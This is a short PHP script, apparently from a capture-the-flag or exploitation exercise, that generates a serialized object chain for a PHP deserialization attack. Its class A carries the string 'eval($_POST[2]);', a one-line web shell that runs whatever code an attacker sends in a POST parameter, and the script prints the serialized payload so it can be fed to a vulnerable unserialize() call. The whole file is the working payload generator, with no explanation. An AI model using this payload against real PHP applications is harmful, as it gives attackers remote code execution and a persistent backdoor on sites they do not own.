<?php
class B{
    public $a;
    public function __construct(){
        $this->a=new A;
    }
}
class A{
    public $code;
    public function __construct(){
        $this->code="eval(\$_POST[2]);";
    }
}
$b=new B;
echo(serialize($b));

